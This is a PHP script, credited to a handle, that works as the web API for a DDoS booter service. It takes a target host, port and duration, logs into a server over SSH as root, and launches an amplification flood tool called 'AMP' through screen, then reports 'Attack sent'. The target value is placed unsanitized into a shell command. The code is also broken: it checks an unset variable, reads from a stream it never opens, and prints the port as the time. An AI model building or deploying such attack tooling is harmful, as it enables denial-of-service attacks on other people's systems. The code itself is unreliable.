<?php

//simple api script in php by ɄŁ₮₹₳

//connect to server
$srvip = "SERVER_IP";
$srvpass = "SERVER_PASS";
$srvuser = "root"; //leave this as root
 
//get variables
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];

//get api key
$apikey = $_GET['apikey'];
 
//get methods
$array = array("METHOD", "stop");

$ray = array("API_KEY");

//check for api key
if (!empty($key)) {
} else {
echo 'No API key was provided!';
die();
}

//check api key
if (in_array($key, $ray)) {
} else {
echo 'API key incorrect!';
die();
}
 
//check if time empty
if (!empty($time)) {
} else {
echo 'No API key was provided!';
die();
}
 
//check if host empty
if (!empty($host)) {
} else {
echo 'Host was not provided!';
die();
}

//check if method empty
if (!empty($method)) {
} else {
echo 'Method was not provided!';
die();
}
 
//check if method exists
if (in_array($method, $array)) {
} else {
echo 'Method does not exist!';
die();
}

//methods
if ($method == "METHOD") {
    $srv = "screen -dm ./AMP $host $port amp.txt 1 $time"; 
}

//stop
if ($method == "stop") {
    $srv = "pkill $host -f"; 
}

//ensure ssh2 is installed
if (!function_exists("ssh2_connect")) 
    die("Ensure ssh2 is installed on server!");

if(!($connect = ssh2_connect($srvip, 22))) {
  echo "Connection issue on port 22!";
} else {
 
//check server login credentials
    if(!ssh2_auth_password($connect, $srvuser, $srvpass)) {
        echo "Error: Login failed, one or more of you're server credentials are incorect.";
    } else {
       
//launch attack      
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
                        echo "Attack sent, here are the details; <br>
                        host: $host; <br>
                        port $port; <br>
                        time: $port; <br>
                        method: $method <br>
                        user authed: true

                        ";
            fclose($stream);
        }
    }
}

?>
